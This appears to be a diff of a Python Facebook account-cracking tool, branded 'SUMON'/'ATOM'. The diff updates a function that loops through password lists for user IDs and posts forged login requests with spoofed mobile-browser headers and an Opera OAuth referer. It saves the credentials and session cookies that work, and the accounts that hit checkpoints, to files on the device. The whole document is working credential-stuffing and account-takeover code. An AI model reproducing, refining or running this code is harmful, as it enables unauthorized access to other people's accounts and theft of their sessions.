@@ -1891,12 +1891,10 @@ def p(uid,pwx,tl):
 def x(uid,pwx,tl):
     global oks
     global cps
-    global nv
-    global die
     global twf
     global loop
     global bkas
-    sys.stdout.write(f"\r {green}(M3)-({loop})-(OK {len(oks)})-(CP {len(cps)})-(DIE {len(die)})-(NV {len(nv)})\r"),
+    sys.stdout.write(f"\r {green}(M3--SUMON) ({loop}) (OK-{len(oks)})\r"),
     sys.stdout.flush()
     try:
         for pw in pwx:
@@ -1907,16 +1905,18 @@ def x(uid,pwx,tl):
             data = {
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'display': '',
+            'api_key': '449838951736891',
+            'cancel_url': 'https://auth.opera.com/account/social/v4/callback?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=n13ri0s3Q2OF3OnmT17ctc6vvYFoGo#_=_',
+            'display': 'page',
             'isprivate': '',
             'return_session': '',
-            'skip_api_login': '',
-            'signed_next': '',
+            'skip_api_login': '1',
+            'signed_next': '1',
             'trynum': '1',
             'timezone': '-330',
-            'lgndim': 'eyJ3Ijo0OTEsImgiOjExMTksImF3Ijo0OTEsImFoIjoxMTE5LCJjIjoyNH0=',
-            'lgnrnd': '230704_W7EF',
-            'lgnjs': '1729231624',
+            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
+            'lgnrnd': '220519_1ySy',
+            'lgnjs': '1729400719',
             'email': uid,
             'prefill_contact_point': '',
             'prefill_source': '',
@@ -1925,27 +1925,35 @@ def x(uid,pwx,tl):
             'first_prefill_type': '',
             'had_cp_prefilled': 'false',
             'had_password_prefilled': 'false',
-            'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAK',
+            'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHAAP/XHHHHAJAA',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             headers = {
-            'authority': 'www.facebook.com',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
-            'cache-control': 'max-age=0',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://www.facebook.com',
-            'referer': 'https://www.facebook.com/login.php/',
-            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'Host': f'www.facebook.com',
+            'Connection': 'keep-alive',
+            'Content-Length': '{len(str(logn_data))}',
+            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
+            'sec-ch-ua-model': '"GT-414XOP"',
             'sec-ch-ua-mobile': '?1',
+            'User-Agent': ua,
+            'viewport-width': '400',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'X-FB-LSD': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'sec-ch-ua-platform-version': '"9.0.0"',
+            'X-ASBD-ID': '129477',
+            'dpr': '1.8',
+            'sec-ch-ua-full-version-list': '"Google Chrome";v="105.0.5195.136", "Not)A;Brand";v="8.0.0.0", "Chromium";v="105.0.5195.136"',
+            'sec-ch-prefers-color-scheme': 'dark',
             'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',}
+            'Accept': '*/*',
+            'Origin': f'https://www.facebook.com',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Dest': 'empty',
+            'Referer': f'https://www.facebook.com/login.php?skip_api_login=1&api_key=449838951736891&kid_directed_site=0&app_id=449838951736891&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fv2.12%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D449838951736891%26redirect_uri%3Dhttps%253A%252F%252Fauth.opera.com%252Faccount%252Fsocial%252Fv4%252Fcallback%26scope%3Demail%26state%3Dn13ri0s3Q2OF3OnmT17ctc6vvYFoGo%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D73e1747a-6c63-450b-a0ca-4e4b07910ef1%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.opera.com%2Faccount%2Fsocial%2Fv4%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dn13ri0s3Q2OF3OnmT17ctc6vvYFoGo%23_%3D_&display=page&locale=bn_IN&pl_dbl=0',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100"
+            url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fv2.12%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D449838951736891%26redirect_uri%3Dhttps%253A%252F%252Fauth.opera.com%252Faccount%252Fsocial%252Fv4%252Fcallback%26scope%3Demail%26state%3Dn13ri0s3Q2OF3OnmT17ctc6vvYFoGo%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D73e1747a-6c63-450b-a0ca-4e4b07910ef1%26tp%3Dunspecified%26cbt%3D1729400719715&lwv=100"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -1955,9 +1963,8 @@ def x(uid,pwx,tl):
                 check = check_lock(cid)
                 if "live" in check:
                     if '%3A-1%3A-1' in coki:
-                        #print(f"{cyan}(ATOM-NV){cid}|{pw}")
+                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
                         open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                        nv.append(cid)
                         break
                     else:
                         bkas.append(cid)
@@ -1970,16 +1977,11 @@ def x(uid,pwx,tl):
                            open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                            oks.append(cid)
                            break
-                elif "lock" in check:
-                    #print(f"\33[1;91m(ATOM-DIE){cid}|{pw}")
-                    open("/sdcard/SUMON-DIE-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                    die.append(cid)
-                    break
                 else:
                     break
             elif 'checkpoint' in response:
                 uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                 open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
@@ -1989,7 +1991,7 @@ def x(uid,pwx,tl):
     except ce:
         time.sleep(20)
     except Exception as error:
-         #print({error})
+        #print({error})
         pass
 
 
